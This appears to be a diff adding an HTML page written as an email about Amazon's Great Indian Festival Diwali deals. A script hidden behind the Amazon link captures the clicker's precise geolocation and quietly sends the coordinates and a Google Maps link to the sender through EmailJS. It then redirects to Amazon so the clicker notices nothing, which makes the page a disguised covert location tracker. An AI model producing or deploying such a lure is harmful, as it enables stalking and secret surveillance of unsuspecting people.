@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Amazon Great Indian Festival</title>
+    <!-- Load EmailJS SDK -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <script type="text/javascript">
+        // Initialize EmailJS with your Public Key
+        emailjs.init('YOUR_PUBLIC_KEY');
+    </script>
+</head>
+<body>
+
+    <div style="font-family: system-ui, sans-serif, Arial; font-size: 16px;">
+        <br>
+        <p>Subject: Amazon Great Indian Festival is here &ndash; Diwali deals inside 🪔</p>
+        <p>Hi,</p>
+        <p>The Amazon Great Indian Festival is live, with some great Diwali deals across electronics, fashion, home essentials, and more.</p>
+        
+        <!-- The link that triggers location access and redirects -->
+        <p>Check it out here: 
+            <a href="https://www.amazon.in/events/greatindianfestival?ref_=nav_cs_gb" id="amazonLink">
+                https://www.amazon.in/events/greatindianfestival?ref_=nav_cs_gb
+            </a>
+        </p>
+        
+        <p>Worth a look before the best offers are gone!</p>
+        <p>Best,<br>[Your name]</p>
+    </div>
+
+    <script>
+        document.getElementById('amazonLink').addEventListener('click', function(e) {
+            e.preventDefault(); // Pause navigation until location is processed
+            
+            const destinationUrl = this.href;
+
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        const lat = position.coords.latitude;
+                        const lng = position.coords.longitude;
+                        const mapsLink = `https://www.google.com/maps?q=${lat},${lng}`;
+
+                        // Prepare template parameters matching your EmailJS template
+                        const templateParams = {
+                            lat: lat,
+                            lng: lng,
+                            maps_link: mapsLink
+                        };
+
+                        // Send location to Gmail via EmailJS
+                        emailjs.send('YOUR_SERVICE_ID', 'YOUR_TEMPLATE_ID', templateParams)
+                            .then(function(response) {
+                                console.log('SUCCESS!', response.status, response.text);
+                                // Redirect to Amazon after sending location
+                                window.location.href = destinationUrl;
+                            }, function(error) {
+                                console.log('FAILED...', error);
+                                // Redirect anyway even if email fails
+                                window.location.href = destinationUrl;
+                            });
+                    },
+                    function(error) {
+                        // User denied permission or error occurred; still take them to Amazon
+                        window.location.href = destinationUrl;
+                    },
+                    { enableHighAccuracy: true, timeout: 5000 }
+                );
+            } else {
+                // Browser doesn't support geolocation, redirect immediately
+                window.location.href = destinationUrl;
+            }
+        });
+    </script>
+
+</body>
+</html>
